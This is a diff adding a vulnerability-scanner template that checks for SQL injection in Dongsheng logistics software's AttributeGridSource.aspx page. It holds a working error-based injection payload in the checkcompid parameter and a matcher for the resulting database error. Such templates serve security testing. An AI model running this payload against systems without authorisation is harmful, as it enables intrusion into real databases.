@@ -1,0 +1,30 @@
+id: dongshengsoft-AttributeGridSource-sqli
+info:
+  name: 东胜物流软件 AttributeGridSource.aspx 存在SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/zan8in/afrog/blob/e7797d9131af41a0fe63b046452bf15a816a4966/pocs/afrog-pocs/vulnerability/dongsheng-attributegridsource-sqli.yaml#L4
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: dongshengsoft,sqli
+
+http:
+  - raw:
+      - |
+        GET /Attributes/AttributeGridSource.aspx?handle=compattrlistpage&checkcompid=1'and +1<@@VERSION-- HTTP/1.1
+        Host: {{Hostname}}
+
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,'在将 nvarchar 值')
+        condition: and
